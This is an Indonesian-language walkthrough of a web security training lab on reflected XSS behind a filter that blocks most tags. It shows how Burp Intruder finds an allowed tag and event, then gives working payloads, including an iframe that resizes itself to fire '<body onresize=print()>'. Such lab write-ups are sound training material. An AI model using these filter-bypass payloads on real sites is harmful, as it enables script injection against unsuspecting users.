## LAB 2 Reflected XSS into HTML context with most tags and attributes blocked

## Brief:
kerentanan reflected xss di pencarian, tapi pakai wfa
	
## Tujuan:
lakukan print()
	
## Analisa:

1. coba payload biasa dan tidak bisa 

       <img src=1 onerror=print()>
		
	 - step berikutnya adalah mencari tag mana yang tidak blokir dengan intruder

<img width="1920" height="1080" alt="1 payload biasa" src="https://github.com/user-attachments/assets/db79869d-df08-4c39-989d-e10fc967c186" />
	 
2. sekarang set posisi di burp intruder <$$> dan masukan cheet sheat nya dan atttack
	 
<img width="1920" height="1080" alt="2 set posisi" src="https://github.com/user-attachments/assets/c389741e-1f1e-47c5-8bd6-5b0cbe72ce77" />

3. saat selesai tag body 200 succes tapi yang lain 400 atau tidak diijinkan
	 
<img width="1920" height="1080" alt="3 body tag" src="https://github.com/user-attachments/assets/59d7535a-312d-4928-b0ba-92f65fbcefc4" />

4. sekarang ganti ke berikut di pencarian dan copy event di cheet shet dan attack

       <body%20=1> -> <body%20$$=1
	    
<img width="1920" height="1080" alt="4 set payload event" src="https://github.com/user-attachments/assets/0142a2ee-0846-4358-8305-ddc2a525bc89" />

5. resize 200 yang lain 400
	 
<img width="1920" height="1044" alt="5 resize sukse" src="https://github.com/user-attachments/assets/321f2d74-857e-4ebf-9e77-276bf351600e" />

6. masukan exploit:

   		<iframe src="https://exploit-0a0d0076044e873e806502fa015200ef.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
	    
	  	<iframe src="https://exploit-0a0d0076044e873e806502fa015200ef.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
	    
<img width="1922" height="1046" alt="6 payload dan berhasil" src="https://github.com/user-attachments/assets/d11d4dec-38e2-41b8-a499-7cf6f538569c" />
